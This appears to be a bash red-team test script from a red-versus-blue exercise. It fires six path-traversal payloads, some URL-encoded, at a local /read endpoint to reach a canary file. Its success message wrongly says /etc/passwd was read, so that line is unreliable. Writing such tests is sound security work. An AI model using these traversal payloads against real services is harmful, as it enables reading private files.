#!/usr/bin/env bash
# Red team: Path Traversal via /read — try to escape notes dir
# exit 0 = read a file outside notes dir (RED WINS)
# exit 1 = all traversals blocked (BLUE WINS)
set -u
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-18080}"
BASE="http://${TARGET_HOST}:${TARGET_PORT}/read"
SUCCESS=1

payloads=(
  '../../tmp/path_canary.txt'
  '../../../tmp/path_canary.txt'
  '....//....//tmp/path_canary.txt'
  '..%2f..%2f..%2ftmp%2fpath_canary.txt'
  '%2e%2e/%2e%2e/%2e%2e/tmp/path_canary.txt'
  '/tmp/path_canary.txt'
)

echo "---raw---"
for i in "${!payloads[@]}"; do
  p="${payloads[$i]}"
  resp=$(curl -sS --max-time 4 "${BASE}?name=${p}" 2>&1) || true
  if echo "$resp" | grep -qF 'CANARY_PATH_5c9e0a'; then
    echo "PAYLOAD[$i] TRAVERSAL_SUCCESS: ${p}"
    SUCCESS=0
  else
    echo "PAYLOAD[$i] blocked: ${p}"
  fi
done
echo "---/raw---"

if [ "$SUCCESS" -eq 0 ]; then
  echo "EVIDENCE: path traversal succeeded — read /etc/passwd via /read"
  exit 0
fi
echo "EVIDENCE: all path traversal attempts blocked"
exit 1
